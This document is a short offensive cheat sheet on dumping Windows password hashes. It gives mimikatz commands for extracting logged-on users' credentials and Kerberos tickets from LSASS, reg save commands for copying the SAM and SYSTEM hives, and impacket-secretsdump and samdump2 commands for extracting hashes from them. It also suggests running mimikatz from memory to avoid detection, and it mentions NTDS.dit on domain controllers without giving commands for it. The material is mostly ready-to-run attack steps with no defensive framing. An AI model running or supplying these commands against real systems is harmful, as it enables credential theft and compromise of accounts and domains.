# Dump Password Hashes

Since implementation of Kerberos authentication, password hashes must be stored somewhere in memory (in order to renew TGT requests). In modern Windows versions hashes are stored in the LSASS memory space.

## Mimikatz

We can use mimikatz (from an administrative console) to gain access to the hashes stored on the target.

**Note:** In order to avoid mimikatz as standalone application, we can try to execute it directly from memory or built-in tools like Task Manager to dump the entire LSASS process memory and extract the data from another machine.

### Users Logged On Hashes

In order to dump hashes for all users logged on to the current workstation or server (including RDP connections), we execute:

```
C:\> mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

### Users Logged On TGT & TGS Tickets

We can use mimikatz to exract TGT & TGS Kerberos tickets to exploit it's authentication mechanism.

```
C:\> mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets
```

## Obtaining Windows SAM & SYSTEM files (local)

> If we have access to SAM and SYSTEM files we can use impacket-secreptsdump to extract the user hashes:

Files are located at: C:\Windows\System32\config\, obtain them with:

reg save hklm\sam c:\sam
reg save hklm\system c:\system

Now execute use one of the following techniques in order to extract the hashes:

```bash
impacket-secretsdump -sam $SAMFILE -system $SYSTEMFILE local
```

```bash
samdump2 system sam
```

## Obtaining AD hashes (domain)

In a domain environment, hashes for all account in Active Directory are stored on the Domain Controller in a file called **"NTDS.dit"**.
